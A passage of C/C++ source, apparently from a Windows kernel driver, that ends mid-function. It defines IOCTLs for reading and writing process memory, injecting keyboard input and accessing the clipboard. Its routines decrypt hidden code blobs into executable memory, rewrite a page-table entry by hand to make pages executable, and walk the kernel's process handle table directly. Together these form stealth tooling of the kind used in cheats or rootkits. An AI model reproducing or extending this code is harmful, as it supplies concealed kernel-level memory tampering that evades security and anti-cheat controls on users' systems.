#pragma once
#include "COPY_CODE.h"
#include "RunEncrypt.h"

#include <intrin.h>



#define  _FUNCTION_ENTRY(name,x,y)  /*PMDL pMdl = 0 ;*/ x = pGData->FAllocateMemory(pGData,s, &fArry->##name/*, &pMdl*/); \
                                            u##name = (y)x.ExePtr;

#define  _FUNCTION_ENTRY_NEW(name,x,y)  /*PMDL pMdl = 0 ;*/ x = pGData->FAllocateMemory(pGData,s, &fArry->##name/*, &pMdl*/); \
                                           // u##name = (y)x.Ptr;

//#define  _FUNCTION_ENTRY_MDL(name,x,y,z)  x = (y)pGData->FAllocateMemoryApc(pGData, &fArry->##name/*, z*/);

#define  FREE_FUNCTION_ENTRY(name,x)     pGData->FreeMemory(pGData, s, &x); ///if (x.Ptr != 0) {fNtos->ExFreePoolWithTag(x.Ptr,'Tag');}    //if (x.Flags == 2) { fNtos->MmFreeContiguousMemory(x.Ptr); }else { fNtos->MmFreeNonCachedMemory(x.Ptr, fArry->##name##.nPageSize); }// fNtos->MmFreeNonCachedMemory((PVOID)x, fArry->##name##.nPageSize);\

#define  _FUNCTION_IMP(name, x ,...) 	{ /*PMDL pMdlIMP = 0; */ MEMORY_FLAGS MFlagsIMP = pGData->FAllocateMemory(pGData,s,&fArry->##name##/*, &pMdlIMP*/);\
                                         x = ((_Kernel_SELFCALL)MFlagsIMP.ExePtr)(__VA_ARGS__);\
										 FREE_FUNCTION_ENTRY(name, MFlagsIMP);}\

#define  _FUNCTION_IMP_RET(name, x ,y,...) 	{ MEMORY_FLAGS MFlagsIMP = pGData->FAllocateMemory(pGData,s,&fArry->##name##/*, &pMdlIMP*/);\
										    x = (y)((_Kernel_SELFCALL)MFlagsIMP.ExePtr)(__VA_ARGS__);\
										    FREE_FUNCTION_ENTRY(name, MFlagsIMP);}

#define  _FUNCTION_IMP_NORET(name,...) 	{ MEMORY_FLAGS MFlagsIMP = pGData->FAllocateMemory(pGData,s,&fArry->##name##/*, &pMdlIMP*/);\
										    ((_Kernel_SELFCALL)MFlagsIMP.ExePtr)(__VA_ARGS__);\
										    FREE_FUNCTION_ENTRY(name, MFlagsIMP);}


//#define  _FUNCTION_IMP(name, x ,...) 	{  _Kernel_SELFCALL _Buffer_Imp = 0;\
//                                         do{ _Buffer_Imp = (_Kernel_SELFCALL)fNtos->MmAllocateNonCachedMemory(fArry->##name##.nPageSize);}while (_Buffer_Imp == 0); \
//                                        fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp(__VA_ARGS__);\
//										((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 1);\
//										fNtos->MmFreeNonCachedMemory((PVOID)_Buffer_Imp, fArry->##name##.nPageSize);}\




//#define  _FUNCTION_ENTRY2(name,x,y) 	{ y _Buffer_Imp = 0;\
//                                     do{ _Buffer_Imp = (y)fNtos->MmAllocateNonCachedMemory(fArry->##name##.nPageSize);}while (_Buffer_Imp == 0); \
//                                     if(_Buffer_Imp != 0) {fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp;}}\
//
////_SendRecvFromEx uSendRecvFromEx = pGData->FAllocateMemory(pGData, &fArry->SendRecvFromEx, &pMdl);
//#define  _FUNCTION_ENTRY1(name,x,y) 	{ y _Buffer_Imp = 0;\
//                                     do{ _Buffer_Imp = (y)fNtos->MmAllocateNonCachedMemory(fArry->##name##.nPageSize);}while (_Buffer_Imp == 0); \
//                                     if(_Buffer_Imp != 0) {fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp;}}\




//#define  _FUNCTION_ENTRY(name,x,y)  /*PMDL pMdl = 0 ;*/ x = (y)pGData->FAllocateMemory(pGData, &fArry->##name/*, &pMdl*/);
//
//#define  _FUNCTION_ENTRY_MDL(name,x,y,z)  x = (y)pGData->FAllocateMemory(pGData, &fArry->##name/*, z*/);
//
//#define  FREE_FUNCTION_ENTRY(name,x)  fNtos->MmFreeContiguousMemory((PVOID)x);\
                                     // fNtos->IoFreeMdl(x);


// 默认APC <



//#define  FREE_FUNCTION_ENTRY2(name,x) 	{ if(x != 0){ \
//                                            ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)x, fArry->##name##.MaxSize, 0);\
//										fNtos->MmFreeNonCachedMemory((PVOID)x,fArry->##name##.nPageSize); x = 0; }}\
//
//
//
//
//#define  FREE_FUNCTION_ENTRY1(name,x) 	{ if(x != 0){ \
//                                            ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)x, fArry->##name##.MaxSize, 0);\
//										fNtos->MmFreeNonCachedMemory((PVOID)x,fArry->##name##.nPageSize); x = 0; }}\
//
//
//
//#define  _CHANGE_FUNCTION_ENTRY(name,y)  {y u##name = 0;\
//                                     _FUNCTION_ENTRY(name,u##name,y);\
//                                     y OLD_##name =  fArry->##name##.SelfTradition; fArry->##name##.SelfTradition = u##name;\
//                                     if(OLD_##name) {((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)OLD_##name, fArry->##name##.MaxSize, 1);\
//                                     fNtos->MmFreeNonCachedMemory((PVOID)OLD_##name,fArry->##name##.nPageSize);}}\
//
//
//
//#define  CHANGE_FUNCTION_ENTRY(name,x,y)  {y u##name = 0;\
//                                     _FUNCTION_ENTRY(name,u##name,y);\
//                                     y OLD_##name = x; x = u##name;\
//                                     if(OLD_##name) {((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)OLD_##name, fArry->##name##.MaxSize, 1);\
//                                     fNtos->MmFreeNonCachedMemory((PVOID)OLD_##name,fArry->##name##.nPageSize);}}\
//
//
//#define FLUSH_FUNCTION_ENTRY(name,x,y) 		FREE_FUNCTION_ENTRY(name, x);\
//                                            _FUNCTION_ENTRY(name, x, y);


#define IoGetNextIrpStackLocationV(Irp) ((Irp)->Tail.Overlay.CurrentStackLocation - 1);

//NT_ASSERT((InvokeOnSuccess || InvokeOnError || InvokeOnCancel) ? (CompletionRoutine != NULL) : TRUE);
#define IoSetCompletionRoutineV(Irp,y,z,InvokeOnSuccess,InvokeOnError,InvokeOnCancel) {\
	PIO_STACK_LOCATION irpSp;\
	irpSp = IoGetNextIrpStackLocationV(Irp);\
	irpSp->CompletionRoutine = y;\
	irpSp->Context = z;\
	irpSp->Control = 0;\
	if (InvokeOnSuccess) {irpSp->Control = SL_INVOKE_ON_SUCCESS;}\
	if (InvokeOnError) {irpSp->Control |= SL_INVOKE_ON_ERROR;}\
	if (InvokeOnCancel) {irpSp->Control |= SL_INVOKE_ON_CANCEL;}}


#define InsertHeadListV(ListHead, Entry) {PLIST_ENTRY NextEntry = ListHead->Flink;\
	Entry->Flink = NextEntry;\
	Entry->Blink = ListHead;\
	NextEntry->Blink = Entry;\
	ListHead->Flink = Entry;}

#define MiFillPteHierarchy(Ptr,PLM4,PTEBASE)  	DWORD64 Base = 0x7FFFFFFFF8; PLM4[0] = ((Ptr >> 9) & Base) + PTEBASE;\
                                    PLM4[1] = ((PLM4[0] >> 9) & Base) + PTEBASE;\
                                    PLM4[2] = ((PLM4[1] >> 9) & Base) + PTEBASE;\
                                    PLM4[3] = ((PLM4[2] >> 9) & Base) + PTEBASE;


#define GetAddressPfn(Ptr,PTEBASE,pMpte)  	DWORD64 PLM4[4] = { 0 };\
                            MiFillPteHierarchy(Ptr, PLM4,PTEBASE);\
                            int i = 4; pMpte = (MMPTE*)PLM4[0];\
                            do{i--;MMPTE pCurMM = *(MMPTE*)PLM4[i];\
	       if (pCurMM.u.Hard.LargePage == 1){pMpte = (MMPTE*)PLM4[i];break;}\
	       if (pCurMM.u.Hard.Valid == 0){pMpte = 0; break;}\
                   } while (i != 0);



#define FLUSH_EXTIMER(pGData,CurIndex)  if (pGData->Map_Timer[CurIndex].ExTimer != 0){\
                                        fNtos->ExDeleteTimer(pGData->Map_Timer[CurIndex].ExTimer, TRUE, FALSE, &pGData->Map_Timer[CurIndex].Delete);\
                                        pGData->Map_Timer[CurIndex].ExTimer = 0;\
                                       do {\
	                                   pGData->Map_Timer[CurIndex].ExTimer = fNtos->ExAllocateTimer(pGData->Map_Timer[CurIndex].PollingExTimer,pGData, EX_TIMER_HIGH_RESOLUTION);\
                                       } while (pGData->Map_Timer[CurIndex].ExTimer == 0);}\









#define BROTHER_DRIVERCODE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN,0x1000,METHOD_BUFFERED,FILE_ALL_ACCESS)
#define BROTHER_DRIVERCODE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN,0x1001,METHOD_BUFFERED,FILE_ALL_ACCESS)
#define BROTHER_DRIVERCODE_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x1002,METHOD_BUFFERED,FILE_ALL_ACCESS)
#define BROTHER_DRIVERCODE_KEY CTL_CODE(FILE_DEVICE_UNKNOWN,0x1003,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_MOUDLE CTL_CODE(FILE_DEVICE_UNKNOWN,0x1004,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_KEYBORAD CTL_CODE(FILE_DEVICE_UNKNOWN,0x1010,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_FILE CTL_CODE(FILE_DEVICE_UNKNOWN,0x1030,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_MUTEX CTL_CODE(FILE_DEVICE_UNKNOWN,0x1040,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_OPENPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN,0x2001,METHOD_BUFFERED,FILE_ALL_ACCESS)

#define BROTHER_DRIVERCODE_MSG CTL_CODE(FILE_DEVICE_UNKNOWN,0x1080,METHOD_BUFFERED,FILE_ALL_ACCESS)


#define ARG_NtUserGetForegroundWindow 0
#define ARG_NtUserCallHwndLock 1
#define ARG_NtUserFindWindowEx 2
#define ARG_NtUserSendInput 3
#define ARG_ClientToSccreen 4
#define ARG_GetClipboardData 5
#define ARG_SetClipboardData 6
#define ARG_EmptyClipboardData 7
#define ARG_PostMessage 8
#define ARG_NtUserEnumDisplaySettings 9
#define ARG_PICTURE 10
#define ARG_NtUserSetWindowLongPtr 11

#define CF_UNICODETEXT 13


#define ARG_PROCESS_MOUDLE 0x10001
#define ARG_PROCESS_PID 0x10002

//#pragma optimize("", off)
//#pragma optimize("gs", off)
//#pragma optimize("guard", off)
//

unsigned int _hEncrypt(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size) {
	
	__try
	{
		char* pBuffer = (char*)pDate;
		unsigned int TempChenk = RandSgin;
		for (unsigned int i = 0; i < Size; i++) {
			unsigned int TempA = TempChenk << 6;
			unsigned int TempB = TempChenk >> 2;
			TempA = TempA + TempB;
			TempB = pBuffer[i] & 0xFF;
			TempA = TempA + TempB + 0x9E3779B9;
			TempChenk = TempA ^ TempChenk;
		}
		return TempChenk;
	}
	__except (1) {


	}
}



void _hEncrypt_DEC(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size) {
	__try
	{
		char* pBuffer = (char*)pDate;
		unsigned int TempChenk = RandSgin;
		for (unsigned int i = 0; i < Size; i++) {
			unsigned int TempA = TempChenk << 6;
			unsigned int TempB = TempChenk >> 2;
			TempA = TempA + TempB;
			TempB = TempChenk & 0xFF;
			TempA = TempA + TempB + 0x9E3779B9;
			TempChenk = TempA ^ TempChenk;
			pBuffer[i] = pBuffer[i] ^ (unsigned char)TempChenk;
		}
	}
	__except (1) {


	}
}

void _hEncrypt_DEC_V(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size) {

	__try
	{
		int nCount = Size / 0x20;
		if (Size % 0x20)nCount++;
		for (int iNeed = 0; iNeed < nCount; iNeed++) {
			char* pBuffer = (char*)pDate + 0x20 * iNeed;
			unsigned int TempChenk = RandSgin + iNeed;
			for (unsigned int i = 0; i < 0x20; i++) {
				unsigned int TempA = TempChenk << 6;
				unsigned int TempB = TempChenk >> 2;
				TempA = TempA + TempB;
				TempB = TempChenk & 0xFF;
				TempA = TempA + TempB + 0x9E3779B7;
				TempChenk = TempA ^ TempChenk;
				pBuffer[i] = pBuffer[i] ^ (unsigned char)TempChenk;
			}
		}
	}
	__except (1) {


	}



}

//MmAllocatePagesForMdlEx
__forceinline PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(PHANDLE_TABLE Table , HANDLE PID){
	unsigned __int64 v2; // rdx
	volatile unsigned __int64 TableCode; // r8
	v2 = (DWORD64)PID & 0xFFFFFFFFFFFFFFFC;
	
	if (v2 >= Table->NextHandleNeedingPool)
		return 0;
	TableCode = Table->TableCode;
	if ((TableCode & 3) == 1)
		return  (PHANDLE_TABLE_ENTRY)(*(DWORD64*)(TableCode + 8 * (v2 >> 10) - 1) + 4 * (v2 & 0x3FF));
	if ((TableCode & 3) != 0)
		return  (PHANDLE_TABLE_ENTRY)(*(DWORD64*)(*(DWORD64*)(TableCode + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF)) + 4 * (v2 & 0x3FF));
	return (PHANDLE_TABLE_ENTRY)(TableCode + 4 * v2);
}




__forceinline PEPROCESS GetProcessEprocess(PVOID _pGData, HANDLE PID) {

	__try {

		Global_Data* pGData = (Global_Data*)_pGData;
		PHANDLE_TABLE_ENTRY hTableEntry = ExpLookupHandleTableEntry((PHANDLE_TABLE)(*(ULONGLONG*)pGData->fNtos.PspCidTable), PID);
		PEPROCESS eprocess = 0;
		if (hTableEntry) {
			eprocess = (PEPROCESS)((LONGLONG)hTableEntry->Object >> 16 & 0xFFFFFFFFFFFFFFF0);
		}
		return eprocess;
	}
	__except (1) {

	}

}





__forceinline PVOID NTAPI LoadMemoryToUser(PVOID pGData, MemoryMDL* pMmem, PVOID addr,
	DWORD nSize, KPROCESSOR_MODE Mode, ULONG Protect)
{
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	pMmem->pMdl = fNtos->IoAllocateMdl(addr, nSize, 0, 0, NULL); //IoAllocateMdl(addr, nSize, 0, 0, NULL);
	if (pMmem->pMdl != 0)
	{
		pMmem->Flags |= 1;
		fNtos->MmBuildMdlForNonPagedPool(pMmem->pMdl);
		pMmem->Buffer = addr;
		pMmem->MapBuffer = fNtos->MmMapLockedPagesSpecifyCache(pMmem->pMdl, Mode, MmCached, NULL, FALSE, NormalPagePriority);
		pMmem->Flags |= 2;
		if (Mode == KernelMode){
			if (Protect != PAGE_READWRITE){  
				pMmem->status = fNtos->MmProtectMdlSystemAddress(pMmem->pMdl, Protect);
			}
		}
		return pMmem->MapBuffer;
	}
	return (PVOID)0;
}


//[[forceinline]]
__forceinline VOID NTAPI FreeMemoryMDL(PVOID pGData, MemoryMDL* pMem){
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	if (pMem->Flags & 1){
		fNtos->IoFreeMdl(pMem->pMdl);
	}
	if (pMem->Flags & 2)
	{
		fNtos->MmUnmapLockedPages(pMem->MapBuffer, pMem->pMdl);
	}
}



__forceinline BOOLEAN NTAPI SafeMemory(PVOID _pGData, SOCKET s, PVOID adr, PVOID val, DWORD valSize, DWORD flags) {


	Global_Data* pGData = (Global_Data*)_pGData;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	// fNtos->MmIsAddressValid(adr)  && fNtos->MmIsAddressValid((char *)adr + valSize -1)
	if (fNtos->MmUserProbeAddress < (((ULONG64)adr) + valSize)) {

		PVOID pBasePage = (PVOID)((ULONGLONG)adr & 0xFFFFFFFFFFFFF000);
		ULONG nearByte = (ULONGLONG)adr & 0xFFF;
		DWORD pageSize = 1;
		if (nearByte + valSize > 0x1000)
		{
			pageSize = (nearByte + valSize) / 0x1000;
			if ((nearByte + valSize) % 0x1000 != 0) {
				pageSize++;
			}
		}
		SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
		MemoryMDL pMem;
		fNtos->memset(&pMem, 0, sizeof(MemoryMDL));
		//DWORD64 pRet = 0;
		//_FUNCTION_IMP(LoadMemoryToUser, pRet, pGData, &pMem, pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_READWRITE);
		DWORD NeedSize = PAGE_SIZE * pageSize;
		DWORD64 pRet = (DWORD64)LoadMemoryToUser(pGData, &pMem, pBasePage, NeedSize, KernelMode, PAGE_READWRITE);

		//PVOID pADRA = (PVOID)fArry->LoadMemoryToUser.SelfTradition(pGData, &pMem, pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_READWRITE);
		if (pRet != 0)
		{
			if (flags == 0)
				fNtos->CopyMemory(val, (char*)pRet + nearByte, valSize);
			if (flags == 1)
				fNtos->CopyMemory((char*)pRet + nearByte, val, valSize);

			FreeMemoryMDL(pGData, &pMem);;
			return 0;
		}
		FreeMemoryMDL(pGData, &pMem);;


	}
	return 1;
}

__forceinline BOOLEAN NTAPI SafeMemoryWhy(PVOID _pGData, SOCKET s, PVOID adr, PVOID val, DWORD valSize, DWORD flags) {
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	if (fNtos->MmUserProbeAddress < (((ULONG64)adr) + valSize)) {
		SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;



		PMDL pMdl = fNtos->IoAllocateMdl(adr, valSize, 0, 0, NULL);



		//MmProbeAndLockSelectedPages(pMdl,)


		//MemoryMDL pMem;
		//fNtos->memset(&pMem, 0, sizeof(MemoryMDL));
		//DWORD64 pRet = 0;
		//_FUNCTION_IMP(LoadMemoryToUser, pRet, pGData, &pMem, pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_READWRITE);
		//DWORD NeedSize = PAGE_SIZE * pageSize;
		//DWORD64 pRet = (DWORD64)LoadMemoryToUser(pGData, &pMem, pBasePage, NeedSize, KernelMode, PAGE_READWRITE);

		//PVOID pADRA = (PVOID)fArry->LoadMemoryToUser.SelfTradition(pGData, &pMem, pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_READWRITE);
		//if (pRet != 0)
		//{
		//	if (flags == 0)
		//		fNtos->CopyMemory(val, (char*)pRet + nearByte, valSize);
		//	if (flags == 1)
		//		fNtos->CopyMemory((char*)pRet + nearByte, val, valSize);

		//	FreeMemoryMDL(pGData, &pMem);;
		//	return 0;
		//}
		//FreeMemoryMDL(pGData, &pMem);;


	}
	return 1;
}





typedef struct _ADDRESS_PTE
{
	union{
		struct PTE_NUMBER{
			ULONGLONG offset : 12;
			ULONGLONG PXE_PageNumber : 9;
			ULONGLONG PPE_PageNumber : 9;
			ULONGLONG PDE_PageNumber : 9;
			ULONGLONG PTE_PageNumber : 9;
			ULONGLONG High : 16;
		};
		ULONGLONG Address;
	}u;
}ADDRESS_PTE;



















PVOID ExAllocateFunctionMemoryV(PVOID _pGData, CODE_CALL* pCodeCall, PMDL* pMdl) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	PHYSICAL_ADDRESS Low = { 0 };
	PHYSICAL_ADDRESS High = { MAXULONG64 };
	PVOID Ptr = 0;
	do {
		Ptr = MmAllocateContiguousMemorySpecifyCache(pCodeCall->nPageSize, Low, High, Low, MmNonCached);
	} while (Ptr == 0);

	PMDL mdl = 0;
	do {
		mdl = IoAllocateMdl(Ptr, (ULONG)pCodeCall->nPageSize, FALSE, FALSE, 0);
	} while (mdl == 0);
	*pMdl = mdl;

	RtlCopyMemory(Ptr, pCodeCall->Ptr, pCodeCall->MaxSize);
	_hEncrypt_DEC_V(pGData, pCodeCall->Sgin, Ptr, pCodeCall->MaxSize);
	MmBuildMdlForNonPagedPool(mdl);

	LOG_DEBUG("<%p>\n", Ptr);

	PVOID GPtr = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
	MmFreeContiguousMemory(Ptr);

	NTSTATUS status = MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE);
	LOG_DEBUG("<%08X>\n", status);
	if (NT_SUCCESS(status)) {

		MMPTE* pMmpte = 0;
		GetAddressPfn((DWORD64)GPtr, pGData->PTE_BASE, pMmpte);
		
		LOG_DEBUG("Valid : %08X;  Dirty1 : %08X; Owner : %08X; WriteThrough : %08X; CacheDisable : %08X; Accessed : %08X; Dirty : %08X; LargePage : %08X; Global : %08X; CopyOnWrite :%08X; Unused : %08X; Write : %08X; ReservedForHardware : %08X; ReservedForSoftware : %08X; WsleAge : %08X; WsleProtection : %08X; NoExecute : %08X;\n",
			pMmpte->u.Hard.Valid, pMmpte->u.Hard.Dirty1, pMmpte->u.Hard.Owner, pMmpte->u.Hard.WriteThrough
			, pMmpte->u.Hard.CacheDisable, pMmpte->u.Hard.Accessed, pMmpte->u.Hard.Dirty, pMmpte->u.Hard.LargePage
			, pMmpte->u.Hard.Global, pMmpte->u.Hard.CopyOnWrite, pMmpte->u.Hard.Unused, pMmpte->u.Hard.Write, pMmpte->u.Hard.ReservedForHardware, pMmpte->u.Hard.ReservedForSoftware
			, pMmpte->u.Hard.WsleAge, pMmpte->u.Hard.WsleProtection, pMmpte->u.Hard.NoExecute);

		
		
		LOG_DEBUG("<%p>", pMmpte->u.Long);


		*pMdl = mdl;
		return GPtr;
	}
	IoFreeMdl(mdl);
	//MmFreeContiguousMemory(Ptr);
	return 0;
}


PVOID ExAllocateFunctionMemoryA(PVOID _pGData, CODE_CALL* pCodeCall) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	PHYSICAL_ADDRESS Low = { 0 };
	PHYSICAL_ADDRESS High = { MAXULONG64 };
	PVOID Ptr = 0;
	do {
		Ptr = MmAllocateContiguousMemorySpecifyCache(pCodeCall->nPageSize, Low, High, Low, MmNonCached);
	} while (Ptr == 0);

	RtlCopyMemory(Ptr, pCodeCall->Ptr, pCodeCall->MaxSize);
	_hEncrypt_DEC_V(pGData, pCodeCall->Sgin, Ptr, pCodeCall->MaxSize);
	MMPTE* pMmpte = 0;
	GetAddressPfn((DWORD64)Ptr, pGData->PTE_BASE, pMmpte);
	MMPTE NewPte; NewPte.u.Long = 0x0A00000000000139;

	//NewPte.u.Hard.Valid = 1;
	//NewPte.u.Hard.WriteThrough = 1;
	//NewPte.u.Hard.CacheDisable = 1;
	//NewPte.u.Hard.Accessed = 1;
	//NewPte.u.Hard.Global = 1;
	//NewPte.u.Hard.WsleAge = 0xA;

	//LOG_DEBUG("<%p>\n", NewPte.u.Long);

	NewPte.u.Hard.PageFrameNumber = pMmpte->u.Hard.PageFrameNumber;

	*pMmpte = NewPte;
	__invlpg(pMmpte);
	return Ptr;
}


FORCEINLINE
BOOLEAN ChangeEntryList(PVOID _pGData, SOCKET s, PLIST_ENTRY HeadEntry, PLIST_ENTRY NowEntry, BOOLEAN Flags) {


	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SOCKET_INFO* pSocket = &pGData->wsk._SocketArry[s];

	//SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, HeadEntry, s, 0);
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, &pSocket->MemoryLock, s, 0);
	KIRQL irql = fNtos->KeAcquireSpinLockRaiseToDpc(&pSocket->MemoryLock);

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, NowEntry, 0, 0);

	if (Flags == 1){
		InsertHeadList(HeadEntry, NowEntry);
	}
	else if(Flags == 0)
	{
		RemoveEntryList(NowEntry);
	}
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	fNtos->KeReleaseSpinLock(&pSocket->MemoryLock, irql);
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	return TRUE;
}


FORCEINLINE
BOOLEAN ChangeEntryListSocket(PVOID _pGData, char* Buffer, SOCKET s, PLIST_ENTRY HeadEntry, PLIST_ENTRY NowEntry, BOOLEAN Flags) {


	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SOCKET_INFO* pSocket = &pGData->wsk._SocketArry[s];

	//SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, HeadEntry, s, 0);
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, &pSocket->MemoryLock, s, 0);
	KIRQL irql = fNtos->KeAcquireSpinLockRaiseToDpc(&pSocket->MemoryLock);

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, NowEntry, 0, 0);

	if (Flags == 1) {
		InsertHeadList(HeadEntry, NowEntry);
	}
	else if (Flags == 0)
	{
		RemoveEntryList(NowEntry);
	}
	else if (Flags == 2)
	{

		PLIST_ENTRY pEntry = &pGData->wsk.ListSocketRecv;
		PLIST_ENTRY bEntry = pEntry->Flink;
		int ErrorIndex = 0;
		while (bEntry != pEntry) {
			LIST_SOCKET* pSocketNow = (LIST_SOCKET*)bEntry;
			Buffer[pSocketNow->s - 1] = 1;
			bEntry = bEntry->Flink;
			ErrorIndex++;
			if (bEntry == 0 || ErrorIndex > 128) {
				break;
			}
		}
	}
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	fNtos->KeReleaseSpinLock(&pSocket->MemoryLock, irql);
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, _pGData, 0, 0);
	return TRUE;
}



FORCEINLINE
BOOLEAN ChangeEntryListData(PVOID _pGData, SOCKET s, PLIST_ENTRY HeadEntry, PLIST_ENTRY NowEntry, BOOLEAN Flags) {


	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	WSK_SERVER_INFO* pSocket = &pGData->wsk;

	KSOCKET* pSocketNumber = &pGData->wsk.bWsk.kSocket[s];

	KIRQL irql = fNtos->KeAcquireSpinLockRaiseToDpc(&pSocket->DataMemoryLock);
	if (Flags) {

		if (pSocketNumber->AsyncContext.Irp != 0) {
			fNtos->IoReuseIrp(pSocketNumber->AsyncContext.Irp, STATUS_UNSUCCESSFUL);
			fNtos->IoFreeIrp(pSocketNumber->AsyncContext.Irp);
			pSocketNumber->AsyncContext.Irp = 0;
		}

		InsertHeadList(HeadEntry, NowEntry);
	}
	else
	{
		if (pSocketNumber->AsyncContext.Irp == 0) {
			do
			{
				pSocketNumber->AsyncContext.Irp = fNtos->IoAllocateIrp(1, FALSE);
			} while (pSocketNumber->AsyncContext.Irp == 0);
		}


		RemoveEntryList(NowEntry);
	}
	fNtos->KeReleaseSpinLock(&pSocket->DataMemoryLock, irql);
	return TRUE;
}



MEMORY_FLAGS ExAllocateFunctionMemory(PVOID _pGData, SOCKET s, CODE_CALL* pCodeCall) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;

	MEMORY_FLAGS MemoryFlags;
	fNtos->memset(&MemoryFlags, 0, sizeof(MemoryFlags));
	//fNtos->memset(&MemoryFlags)
	MemoryFlags.Flags = KeGetCurrentIrql();
	MemoryFlags.Size = pCodeCall->nPageSize;
	PVOID Ptr = 0;
	SOCKET_INFO* pSocket = &pGData->wsk._SocketArry[s];
	MemoryFlags.Flags = 2;
	if (MemoryFlags.Flags == 2){
		
		if (pSocket->DpcMemory.Blink == &pSocket->DpcMemory)
		{
			PHYSICAL_ADDRESS Low = { 0 };
			PHYSICAL_ADDRESS High = { MAXULONG64 };
			do {

				Ptr = fNtos->MmAllocateContiguousMemorySpecifyCache(pCodeCall->nPageSize, Low, High, Low, MmNonCached);

			} while (Ptr == 0);

		}
		else {

			LIST_ENTRY* pNext = pSocket->DpcMemory.Blink;
			do
			{
				Memory_Exe_Info* pMemory = (Memory_Exe_Info*)pNext;
				if (pMemory->nPageSize >= pCodeCall->nPageSize) {
					Ptr = pMemory->Ptr;
					MemoryFlags.MemoryExePtr = pMemory;
					
					//RemoveEntryList(pNext);
					ChangeEntryList(pGData, s, pNext, pNext, 0);

					break;
				}
